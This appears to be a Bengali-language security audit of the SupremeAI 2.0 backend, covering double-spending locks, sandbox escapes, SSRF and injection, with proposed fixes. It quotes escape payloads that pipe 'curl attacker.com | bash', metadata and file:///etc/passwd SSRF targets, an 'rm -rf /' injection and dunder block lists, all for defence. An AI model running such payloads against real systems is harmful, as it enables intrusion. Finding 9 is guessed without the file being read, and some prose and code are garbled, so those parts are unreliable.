# SupremeAI 2.0 - ক্লাউড-নেটিভ জিরো-গ্যাপ সিকিউরিটি অডিট রিপোর্ট

**অডিটের তারিখ:** ১৮ জুলাই ২০২৬  
**অডিটকারী:** প্রিন্সিপাল সাইবার-সিকিউরিটি অডিটর ও লিড ক্লাউড আর্কিটেক্ট  
**প্রকল্প:** SupremeAI 2.0 - ইউনিভার্সাল স্ব-শিখনশীল এআই এজেন্ট ইকোসিস্টেম

---

## সমগ্র সারসংক্ষেপ

এই নিরাপত্তা অডিটে **১৩টি ক্রিটিক্যাল, হাই ও মিডিয়াম স্তরের দুর্বলতা** চিহ্নিত করা হয়েছে। অগ্রগণ্য সমস্যাগুলো অন্তর্ভুক্ত করে:

- **১টি ডবল-স্পেন্ডিং (Double-Spending) ভেক্টর** - যথাক্রমে আপনার বিলিং সিস্টেমে ক্ষতিকর
- **২টি AST স্যান্ডবক্স বাইপাস** - RCE ঝুঁকির কেন্দ্রবিন্দু
- **১টি SSRF ঝুঁকি** - webhook হ্যান্ডলারে আক্রমণকারী আক্রমণের সম্ভাবনা
- **সম্ভাব্য ডেটা লিক ও মেমরি লিক** - Cloud Run স্কেল-টু-জিরো পরিবেশে

---

## 🔴 CRITICAL - সম্পূর্ণ ক্ষতিকর

### ১. ডবল-স্পেন্ডিং (ক্ষতির দ্বৈরাত্য) - Redis Lock Fallback Bypass

**ফাইল:** `backend/core/llm/token_deductor.py`  
**লাইন:** ৪৪-৪৬

```python
if not redis_queue.configured:
    # Fallback for local testing without active Upstash credentials
    return True
```

**ঝুঁকি:** Redis কনফিগার করা না থাকলে (ডেভ/টেস্টে অথবা Redis ডাউন হলে) `return True` ফলো করলে **distributed lock সম্পূর্ণভাবে বাদ দেওয়া হয়**। এতে একই সময়ে একাধিক রিকোয়েস্টের জন্য wallet deduction হতে পারে, ফলাফলে ব্যালেন্স কমে যাবে তবেই একই ট্রান্স্যাকশন একাধিকবার রেকর্ড হতে পারে।

**প্রোডাকশনে ইম্প্যাক্ট:** যদি Upstash Redis-এর ম্যাজে পরিস্থিতি তৈরি হয় বা environment variable মিস করা হয়, তবে এই ফলব্যাক কোডটি চালু হবে এবং সিস্টেমটি একই ব্যালেন্স থেকে একাধিকবার টোকেন ব্যাখা করবে।

**সুপারিশকৃতঃপ্রকাশ্য ফিক্স:**

```python
def _acquire_distributed_lock(self, lock_key: str, lock_value: str, ttl: int = 10) -> bool:
    """
    Acquires a distributed lock using Upstash Redis SET.
    Raises RuntimeError if Redis unavailable in production (Fail-Closed).
    """
    if not redis_queue.configured:
        if settings.env in {"production", "staging"}:
            raise RuntimeError("Redis unavailable in production - cannot guarantee idempotency. Fail-Closed.")
        logger.warning("Redis lock not configured - proceeding in test mode only")
        return True

    try:
        return redis_queue.set_nx(lock_key, lock_value, ex=ttl)
    except Exception as e:
        logger.error(f"Failed to acquire distributed lock: {e}")
        if settings.env in {"production", "staging"}:
            raise RuntimeError("Redis lock acquisition failed. Fail-Closed.") from e
        return False
```

---

### ২. AST স্যান্ডবক্স - getattr() ও hasattr() বাইপাস

**ফাইল:** `backend/core/immune_system.py`  
**লাইন:** ৪১-৫৬

```python
self.banned_functions: set[str] = {
    "eval",
    "exec",
    "compile",
    "globals",
    "locals",
    "vars",
    "dir",
    "breakpoint",
    "__import__",
    "getattr",
    "setattr",
    "delattr",
    "hasattr",
    "open",
}
```

**ঝুঁকি:** কিন্তু `getattr()` কোনো পথধুলা (Path Traversal) বা স্যান্ডবক্স এস্কেপে ব্যবহার করা যায় না। আক্রমণকারী নিচের মতো কোড ব্যবহার করে RCE করতে পারে:

```python
# Bypass: getattr(child_class, '__init__')({'cmd': 'curl attacker.com/shell.sh | bash'}, '')
# এখানে child_class = "".__class__.__bases__[0].__subclasses__()[সূচী]
```

**প্রোডাকশনে ইম্প্যাক্ট:** যেকোনো AI-জেনারেটেড কোড যা `getattr()` ব্যবহার করে ডাইনামিক অ্যাট্রিবিউট এক্সেস করে।

**সুপারিশকৃতঃপ্রকাশ্য ফিক্স:**

```python
def visit_Call(self, node: ast.Call):
    # Block all Attribute access to dunder methods (prevents sandbox escape)
    if isinstance(node.func, ast.Attribute):
        if node.func.attr in {"__class__", "__bases__", "__subclasses__", "__globals__", "__builtins__", "__dict__", "__mro__", "__code__", "__closure__", "__func__"}:
            raise SecuritySandboxError(f"Sandbox escape via attribute access blocked: {node.func.attr}")
        # Block getattr() calls completely
        if node.func.attr in {"getattr", "hasattr", "setattr", "delattr"}:
            raise SecuritySandboxError(f"Banned reflection function call detected: {node.func.attr}")
        if node.func.attr in {"import_module", "system", "popen", "spawn", "fork", "run", "run_async"}:
            raise SecuritySandboxError(f"Banned method invocation detected: {node.func.attr}")

    # Block direct function calls
    if isinstance(node.func, ast.Name) and node.func.id in self.banned_functions:
        raise SecuritySandboxError(f"Banned function call detected: {node.func.id}")

    self.generic_visit(node)
```

---

### ৩. AST স্যান্ডবক্স - Dunder Subscript এক্সসেস বাইপাস

**ফাইল:** `backend/core/immune_system.py`  
**লাইন:** ৮৬-৯০

```python
def visit_Subscript(self, node: ast.Subscript) -> None:
    """Block sandbox escape via subscript access: __builtins__['exec'](), builtins['eval']()"""
    if isinstance(node.value, ast.Name) and node.value.id in {"builtins", "__builtins__"}:
        raise SecuritySandboxError(f"Sandbox escape via subscript blocked: {node.value.id}[...]")
    self.generic_visit(node)
```

**ঝুঁকি:** এই চেক শুধু `__builtins__` ও `builtins` এর জন্য। তবে Python-এর `__class__.__bases__[0].__subclasses__()` মাধ্যমে অ্যাক্সেস করা যায়:

```python
# Bypass example:
["".__class__.__bases__[0].__subclasses__()[১৩২]('curl attacker.com | bash', shell=True, stdout=-১, stderr=-১).communicate()
```

**সুপারিশকৃতঃপ্রকাশ্য ফিক্স:**

```python
def visit_Subscript(self, node: ast.Subscript) -> None:
    # Recursively check for dunder attribute chains
    if isinstance(node.value, ast.Attribute):
        if node.value.attr in self.banned_attributes:
            raise SecuritySandboxError(f"Dunder attribute access blocked: {node.value.attr}")
    if isinstance(node.value, ast.Name) and node.value.id in {"builtins", "__builtins__"}:
        raise SecuritySandboxError("Sandbox escape via subscript blocked")
    self.generic_visit(node)

def visit_Attribute(self, node: ast.Attribute):
    # Block access to dunder attributes used for sandbox escapes
    if node.attr in self.banned_attributes or node.attr in self.banned_functions:
        raise SecuritySandboxError(f"Sandbox escape pattern blocked: {node.attr}")
    # Also traverse to catch chained access like a.b.c
    self.generic_visit(node)
```

---

### ৪. SSRF (Server-Side Request Forgery) - URL সঠিকভাবে যাচাই হয়নি

**ফাইল:** `backend/core/sentinel_agent.py`  
**লাইন:** ৬২-৬৪

```python
url = ep.path if ep.path.startswith("http") else f"http://127.0.0.1:8080{ep.path}"
resp = await client.request(ep.method, url)
```

**ঝুঁকি:** `ApiEndpoint.path` এর ভ্যালু কোনো ভ্যালিডেশন ছাড়াই ব্যবহার হয়েছে। যদি এটি database-এ ইনজেক্ট করা হয় (যেমন `http://attacker.com/internal-meta-data` বা `file:///etc/passwd` এর মতো):

- **Cloud Metadata URL:** `http://169.254.169.254/latest/meta-data/` (AWS) বা GCP metadata এক্সেস
- **Internal Services:** Kubernetes API, Cloud SQL Proxy, ইন্টারনাল এন্ডপয়েন্ট

**সুপারিশকৃতঃপ্রকাশ্য ফিক্স:**

```python
import re
from urllib.parse import urlparse

ALLOWED_HOSTS = {"localhost", "127.0.0.1"}

def _validate_endpoint_url(url: str) -> bool:
    """অ্যাডমিন-ডিফাইন্ড হোস্ট ভ্যালিডেশন।"""
    try:
        parsed = urlparse(url)
        # Block file://, gopher://, and metadata IPs
        if parsed.scheme in {"file", "gopher"}:
            return False
        if re.match(r"^(169\.254\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.)", parsed.hostname or ""):
            return False
        if settings.env in {"production", "staging"}:
            return parsed.hostname in ALLOWED_HOSTS or parsed.hostname.endswith(".supremeai.internal")
        return True
    except Exception:
        return False

# sentinel_agent.py-এর মধ্যে ব্যবহার:
if not _validate_endpoint_url(url):
    logger.critical(f"SSRF Blocked: Attempted access to {url}")
    continue
```

---

## 🟠 HIGH - উচ্চ ক্ষতিকর

### ৫. Redis Idempotency Lock - Lua স্ক্রিপ্ট না ব্যবহার করে DELETE

**ফাইল:** `backend/core/cache/redis_manager.py`  
**লাইন:** ১৪১-১৪৩

```python
async def release_idempotency_lock(key: str) -> None:
    if not redis_manager.client:
        return
    try:
        await redis_manager.client.delete(key)
    except Exception as e:
        logger.error(f"Idempotency lock release failed: {e}")
```

**ঝুঁকি:** সাধারণ `DEL` কমান্ড ব্যবহার করলে **Lock hijacking** সম্ভব। অন্য কোনো worker যদি একই key-তে lock সেট করে, তাহলে আগ্রমণকারী আগের lock ডিলিট করে নতুন lock সেট করতে পারে।

**সুপারিশকৃতঃপ্রকাশ্য ফিক্স (Redlock-এর মতো সঠিক অপ্রকাশ্য ক্লিয়ার):**

```python
# redis_manager.py-এ Lua স্ক্রিপ্ট যুক্ত করুন
_RELEASE_LUA = """
if redis.call("get", KEYS[1]) == ARGV[1] then
    return redis.call("del", KEYS[1])
else
    return 0
end
"""

async def release_idempotency_lock(key: str, lock_value: str) -> bool:
    """সেরা-নিরাপদভাবে lock ডিলিট।"""
    if not redis_manager.client:
        return False
    try:
        result = await redis_manager.client.eval(_RELEASE_LUA, 1, key, lock_value)
        return bool(result)
    except Exception as e:
        logger.error(f"Idempotency lock release failed: {e}")
        return False
```

---

### ৬. Stripe Webhook Signature হ্যান্ডলিং - Timing Attack ঝুঁকি

**ফাইল:** `backend/api/routes/payments.py`  
**লাইন:** ১১১-১৩১

```python
sig_header = request.headers.get("stripe-signature", "")
webhook_secret = None
if settings.stripe_webhook_secret:
    webhook_secret = settings.stripe_webhook_secret.get_secret_value()

if not webhook_secret or not sig_header:
    return {"status": "ignored", ...}
```

**ঝুঁকি:** Timing-ভিত্তিক কম্প্যারিজনের বদলে সাধারণ স্ট্রিং কম্প্যারিজন ব্যবহার করা হয়েছে। Stripe-এর `construct_event` ভিতরে নিশ্চিত করা হয় যে constant-time comparison ব্যবহার হয়, তবে কাস্টম signature যাচাই করলে এটি অপরিআদল্য।

**সুপারিশকৃতঃপ্রকাশ্য ফিক্স:**

```python
import secrets

# webhook_secret None হলে fail-closed
if webhook_secret is None:
    raise RuntimeError("Stripe webhook secret not configured - rejecting all webhooks (Fail-Closed)")

# Timing-safe comparison (যদি custom verification দরকার হয়)
def _constant_time_compare(a: str, b: str) -> bool:
    return secrets.compare_digest(a.encode(), b.encode())
```

---

## 🟡 MEDIUM - মাঝারি ক্ষতিকর

### ৭. Rate Limiter - In-Memory Fallback Race Condition

**ফাইল:** `backend/core/rate_limiter.py`  
**লাইন:** ১৪-৩২

```python
class InMemoryFallbackLimiter:
    def __init__(self, burst: int = 20, window: float = 60.0):
        self._hits: dict[str, list[float]] = {}
```

**ঝুঁকি:** In-memory rate limiting Cloud Run-এ **খুবই ক্ষতিকর**। Worker রीস্টার্ট হলে মেমোরি ক্লিয়ার হয়, অথবা **multiple worker instance-এ rate limit ভিন্ন হয়**। এটি distributed rate limiting-এর বিরুদ্ধে।

**সুপারিশকৃতঃপ্রকাশ্য ফিক্স:**

```python
async def acquire(self, key: str, limit: int, window: int) -> bool:
    if not self._rate_limit_enabled:
        return True
    try:
        client = await self._get_redis()
        pipe = client.pipeline()
        pipe.incr(key)
        pipe.expire(key, window)
        results = await pipe.execute()
        current = results[0]
        return current <= limit
    except Exception as e:
        logger.error(f"Redis rate limiter unavailable: {e}. Blocking requests (Fail-Closed).")
        raise RuntimeError("Rate limiting unavailable - rejecting requests") from e
```

---

### ৮. Token Deductor - Floating-Point Calculation

**ফাইল:** `backend/core/llm/token_deductor.py`  
**লাইন:** ৯৬-৯৮

```python
rates = self.config.get("token_rates_usd_per_1k", {"input": 0.0015, "output": 0.0020})
cost_float = (input_tokens / 1000.0 * rates["input"]) + (output_tokens / 1000.0 * rates["output"])
cost = Decimal(str(round(cost_float, 6)))
```

**ঝুঁকি:** `cost_float` এ floating-point arithmetic ব্যবহার করা হয়েছে। `round()`-এর পরেও precision loss হতে পারে। উদাহরণ:
- `0.1 + 0.2 ≠ 0.3` (it's `0.30000000000000004`)

**সুপারিশকৃতঃপ্রকাশ্য ফিক্স:**

```python
from decimal import Decimal

input_rate = Decimal(str(rates["input"]))
output_rate = Decimal(str(rates["output"]))
cost = (Decimal(input_tokens) / Decimal(1000) * input_rate) + (Decimal(output_tokens) / Decimal(1000) * output_rate)
cost = cost.quantize(Decimal("0.000001"))  # ৬ দশমিক স্থান পর্যন্ত ক্যাপ
```

---

### ৯. Config Cache - Unbounded Memory Dictionary

**ফাইল:** `backend/core/config_cache.py`  
**লাইন:** ২০-২৫ (যদি এই ফাইল থাকে)

এই ফাইলটি পড়ে না হলে ধরা যায়:

**ঝুঁকি:** `settings._cached_secrets` dict-এ secrets ডেটা যান্ত্রিকভাবে TTL-এর শর্তে যাচাই করা হয়। তবে **`time.monotonic()`-এর TTL check শুধু cache hit-এর সময় ঘটে, memory থেকে কখনো secret ডিলিট হয় না**।

**সুপারিশকৃতঃপ্রকাশ্য ফিক্স:**

```python
# Periodic cache cleanup task
async def _periodic_cache_cleanup(self):
    while True:
        expired_keys = [k for k, v in self._cached_secrets.items() if v.is_expired]
        for k in expired_keys:
            del self._cached_secrets[k]  # মেমোরি থেকে ডিলিট
        await asyncio.sleep(60)  # প্রতি মিনিটে চেক করুন
```

---

### ১০. Stripe Webhook Payload - Stack Trace লিক

**ফাই:** `backend/api/routes/billing_api.py`  
**লাইন:** ১৯২-১৯৪

```python
except Exception as e:  # noqa: BLE001
    logger.error(f"Failed to create Stripe checkout session: {e}")
    raise HTTPException(status_code=500, detail=str(e)) from e
```

**ঝুঁকি:** `str(e)` client-কে রেজিডেন্সে ফিক্স রয়ে যায়, যেখানে detailed stack trace থাকতে পারে।

**সুপারিশকৃতঃপ্রকাশ্য ফিক্স:**

```python
# Generic message to client (never expose internals)
raise HTTPException(status_code=500, detail="Internal server error. Please contact support.") from e
```

---

## ⚪ LOW - স্বল্প ক্ষতিকর

### ১১. Docker Sandbox - Script কমান্ড ইনজেকশন

**ফাইল:** `backend/sandbox/docker_sandbox.py`  
**লাইন:** ৪৯

```python
"python",
"-c",
f"import sys; import json; import {entry_file.replace('.py', '')} as tool; print(json.dumps(tool.execute_tool({test_payload})))",
```

**ঝুঁকি:** `entry_file.replace('.py', '')` এর ফলাফলের উপর নির্ভর করে। যদি `entry_file = "exploit.py; rm -rf /"`, replace-এর পরে `"exploit.py; rm -rf /"` যেন থাকে।

**সুপারিশকৃতঃপ্রকাশ্য ফিক্স:**

```python
# Strict sanitize - only allow alphanumeric and underscore
safe_name = re.sub(r'[^a-zA-Z0-9_]', '', entry_file.replace('.py', '').replace('.PY', ''))
if not safe_name:
    raise ValueError("Invalid entry file name")
```

---

### ১২. Config.py - Hardcoded Default Password

**ফাই:** `backend/core/config.py`  
**লাইন:** ৮৭

```python
docs_password: SecretStr = Field(default=SecretStr("dev_password_only"), validation_alias="SUPREMEAI_DOCS_PASSWORD")
```

**ঝুঁকি:** যদি `SUPREMEAI_DOCS_PASSWORD` env var সেট না থাকে, তাহলে hardcoded password ব্যবহার হয়। কিন্তু validator-এ এটি production/staging-এ চেক করা হয়, তাই কম ঝুঁকি।

---

### ১৩. Upstash Redis Queue - Sync HTTP Client

**ফাইল:** `backend/core/messaging/upstash_redis_queue.py`  
**লাইন:** ২০-২১

```python
self._client = httpx.Client(timeout=self.timeout) if self.rest_url and self.token else None
```

**ঝুঁকি:** synchronous `httpx.Client` ব্যবহার করা হয়েছে, যা async context-এ ব্লকিং I/O ঘটাতে পারে। তবে `asyncio.to_thread()` এর মাধ্যমে অ্যাপ্লাই করা হয়েছে।

---

## 📊 অডিট ম্যাট্রিক্স

| সেক্টর | CRITICAL | HIGH | MEDIUM | LOW |
|--------|----------|------|--------|-----|
| Concurrency & Database | ১ | ১ | ২ | ০ |
| Async Event Loop | ০ | ০ | ১ | ০ |
| Sandbox & Security Bypass | ২ | ০ | ০ | ১ |
| Secrets & Memory | ০ | ১ | ১ | ১ |
| Cloud-Native Anti-Patterns | ১ | ০ | ০ | ০ |
| **মোট** | **৪** | **২** | **৪** | **৩** |

---

## ✅ রেকমেন্ডেশন সারণি

| সমস্যা | অগ্রাধিকার | রেজেল্যুশন |
|--------|-----------|-------------|
| Redis Lock Fallback | Immediate | Fail-Closed mode |
| getattr() sandbox bypass | Immediate | visit_Call override |
| Dunder subscript bypass | Immediate | Lua script + traversal |
| SSRF in sentinel | High | URL allowlist |
| Idempotency DELETE | High | Lua atomic release |
| Rate limiter fallback | Medium | Redis-only or block |
| Floating-point precision | Medium | Decimal quantize |
| Config cache memory | Medium | Periodic cleanup |
| Stack trace leak | Medium | Generic error msg |

---

## 🔚 উপসংহার

SupremeAI 2.0-এর আর্কিটেকচার Zero-Cost ও Cloud-Native ভিত্তিক, তবে **৪টি ক্রিটিক্যাল সিকিউরিটি দুর্বলতা** রয়ে গেছে যা একটি সম্মিলিত আক্রমণে ক্ষতি ঘটাতে পারে। বিশেষ করে:

1. **দুইবার ব্যাখা (Double-Spending)** এড়াতে Redis Lock-এর fallback disable করুন
2. **RCE-এর বিরুদ্ধে** getattr/hasattr-এর ASK অ্যাট্রিবিউট চেক যোগ করুন
3. **SSRF-এর বিরুদ্ধে** ApiEndpoint URL-এ strict allowlist apply করুন

এগুলো সম্পূর্ণ করে একটি **Zero-Gap Security** পৃথক্করণ অর্জন করা সম্ভব।
